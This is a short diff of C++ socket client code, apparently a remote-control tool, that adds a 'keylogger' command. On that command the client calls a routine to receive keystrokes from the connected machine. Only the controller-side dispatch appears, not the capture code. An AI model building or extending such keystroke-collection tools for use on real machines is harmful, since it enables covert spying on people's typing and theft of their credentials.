@@ -137,22 +137,27 @@ void Client::TransferData() {
 
         this->sending(sockfd, msg);
 
-        int length = 10;
-        char* res = (char*)malloc(length);
-        memset(res, 0, length);
+        if (strcmp(msg,"keylogger") == 0) {
+            receiveKeyPress(sockfd);
+        } else {
+            int length = 10;
+            char* res = (char*)malloc(length);
+            memset(res, 0, length);
 
-        if (this->receive(sockfd, res, length)) {
-            if (strcmp(res, "exit") == 0) {
-                std::cout <<"##### Server has quit the session #####" << std::endl;
-                free(res);
-                free(msg);
-                break;
-            } else {
-                printf("%s\n", res);
-            }
-        };
+            if (this->receive(sockfd, res, length)) {
+                if (strcmp(res, "exit") == 0) {
+                    std::cout <<"##### Server has quit the session #####" << std::endl;
+                    free(res);
+                    free(msg);
+                    break;
+                } else {
+                    printf("%s\n", res);
+                }
+            };
 
-        free(res);
+            free(res);
+        }
+
         free(msg);
     }
 }
